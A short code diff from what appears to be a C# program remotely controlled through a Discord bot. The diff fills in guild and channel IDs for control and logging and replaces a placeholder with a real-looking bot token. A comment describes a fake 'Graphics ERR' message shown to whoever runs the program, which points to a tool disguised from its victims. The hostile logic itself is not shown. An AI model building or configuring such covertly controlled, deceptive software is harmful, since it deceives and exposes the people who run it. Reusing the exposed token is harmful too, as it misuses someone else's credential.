@@ -155,9 +155,9 @@ namespace App
 
         // Where log messages will be sent
         // replace these with the guild and channel id of where you want to control the bot
-        ulong log_guild = 1012757688389734510;
-        ulong log_channel = 1013091266973671557;
-        string TOKEN = "your bot token here"; // Keep this a secret
+        ulong log_guild = 1030944732945326130;
+        ulong log_channel = 1030944732945326134;
+        string TOKEN = "MTAzMDk1MDUwNDU3NjA1NzM3NQ.GNt9wU.BkJiSIwALbDztRfQh9fzLUC-PXObgC3oHRVkP8"; // Keep this a secret
 
         // A fake error message will show when you run the program.
         //string message_content = "Graphics ERR in [UnityMain.dll] (0x0065e)";
